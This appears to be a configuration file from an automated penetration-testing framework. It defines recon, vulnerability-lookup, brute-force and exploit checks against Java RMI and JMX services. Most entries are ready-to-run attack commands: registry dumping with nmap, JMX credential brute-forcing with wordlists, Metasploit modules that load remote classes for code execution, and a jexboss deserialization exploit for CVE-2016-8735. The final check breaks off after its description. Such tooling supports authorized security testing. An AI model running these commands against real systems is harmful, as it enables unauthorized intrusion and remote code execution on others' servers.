#########################################################################################
# JAVA-RMI Settings
#########################################################################################

[config]
default_port = 1099
protocol	 = tcp
categories 	 = recon, vulnscan, bruteforce, exploit

[specific_options]
jmx = boolean
rmissl = boolean


#########################################################################################
# Recon
#########################################################################################
[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Attempt to dump all objects from Java-RMI service
tool        = nmap
command_1   = sudo nmap -sV -Pn -vv -p [PORT] --script='rmi-dumpregistry' --stats-every 10s [IP]
postrun     = nmap_detect_jmx_and_rmissl

[check_rmi-enum]
name        = rmi-enum
category    = recon
description = Enumerate RMI services
tool        = barmie
command_1   = java -jar BaRMIe_*.jar -enum [IP] [PORT]

[check_jmx-info]
name        = jmx-info
category    = recon
description = Get information about JMX and the MBean server
tool        = twiddle
command_1   = ./bin/twiddle.sh -v --host=[IP] --port=[PORT] serverinfo -d -c -l
context_1   = { 'jmx': True }
command_2   = ./bin/twiddle.sh -v --host=[IP] --port=[PORT] get "jboss.system:type=ServerInfo"
context_2   = { 'jmx': True }


#########################################################################################
# Vulnscan
#########################################################################################
[check_vuln-lookup]
name        = vuln-lookup
category    = vulnscan
description = Vulnerability lookup in Vulners.com (NSE scripts) and exploit-db.com (lots of false positive !)
tool        = vuln-databases
command_1   = sudo nmap -sV -T5 -Pn -p [PORT] --script nmap-vulners/vulners.nse --script-args vulscandb=scipvuldb.csv [IP] -oX /tmp/nmaptmp.xml; ./exploit-database/searchsploit --nmap /tmp/nmaptmp.xml; rm -f /tmp/nmaptmp.xml


#########################################################################################
# Bruteforce
#########################################################################################
[check_jmx-bruteforce]
name        = jmx-bruteforce
category    = bruteforce
description = Bruteforce creds to connect to JMX registry
tool        = jmxbf
command_1   = java -cp 'jmxbf.jar:./commons-cli-1.4/*' jmxbf -h [IP] -p [PORT] --usernames-file [WORDLISTSDIR]/services/java-rmi/jmx_usernames.txt --passwords-file [WORDLISTSDIR]/passwords/pass_medium.txt
context_1   = { 'jmx': True, 'auth_status': NO_AUTH }
postrun     = jmxbf_valid_creds


#########################################################################################
# Exploit
#########################################################################################
[check_rmi-default-config-deploy-class]
name        = exploit-rmi-default-config
category    = exploit
description = Exploit default config in RMI Registry to load classes from any remote URL (not working against JMX)
tool        = metasploit
command_1   = sudo msfconsole -x "use exploit/multi/misc/java_rmi_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; [RMISSL true="set SSL true;"]exploit; sleep 15; exit"
context_1   = { 'jmx': False }

[check_jmx-insecure-config-deploy-class]
name        = exploit-jmx-insecure-config
category    = exploit
description = Exploit JMX insecure config. Auth disabled: should be vuln. Auth enabled: vuln only if weak config deployed
tool        = metasploit
command_1   = sudo msfconsole -x "use exploit/multi/misc/java_jmx_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; exploit; sleep 15; exit"
context_1   = { 'jmx': True, 'auth_status': NO_AUTH }
command_2   = sudo msfconsole -x "use exploit/multi/misc/java_jmx_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; set JMX_ROLE [USERNAME]; set JMX_PASSWORD [PASSWORD]; exploit; sleep 15; exit"
context_2   = { 'jmx': True, 'auth_status': POST_AUTH }

[check_tomcat-rmi-deserialize]
name        = tomcat-rmi-deserialize
category    = exploit
description = Exploit Java-RMI deserialize in Tomcat (CVE-2016-8735, CVE-2016-8735), req. JmxRemoteLifecycleListener
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jmxtomcat -u [IP]:[PORT] --cmd whoami
context_1   = { 'jmx': True }

[check_rmi-deserialize-all-payloads]
name        = rmi-deserialize-all-payloads
category    = exploit
description = Attempt to exploit Java deserialize against Java RMI Registry with all ysoserial payloads
